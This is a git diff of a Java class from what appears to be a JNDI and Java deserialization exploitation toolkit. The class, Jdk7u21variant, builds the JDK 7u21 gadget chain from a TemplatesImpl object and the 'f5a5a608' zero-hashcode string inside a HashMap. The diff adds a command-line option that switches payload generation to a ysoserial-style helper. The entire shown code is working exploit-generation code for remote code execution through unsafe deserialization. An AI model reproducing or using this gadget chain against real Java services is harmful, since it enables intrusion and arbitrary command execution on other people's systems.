@@ -3,6 +3,7 @@ package com.qi4l.jndi.gadgets;
 import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 
 import javax.xml.transform.Templates;
@@ -11,11 +12,18 @@ import java.rmi.MarshalledObject;
 import java.util.HashMap;
 import java.util.LinkedHashSet;
 
+import static com.qi4l.jndi.Starter.cmdLine;
+
 @Authors({"potats0"})
 public class Jdk7u21variant implements ObjectPayload<Object>{
 
     public Object getObject(PayloadType type, String... param) throws Exception {
-        Object templates = Gadgets.createTemplatesImpl(type, param);
+        final Object templates;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            templates = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            templates = Gadgets.createTemplatesImpl(type, param);
+        }
         String zeroHashCodeStr = "f5a5a608";
 
         HashMap map = new HashMap();
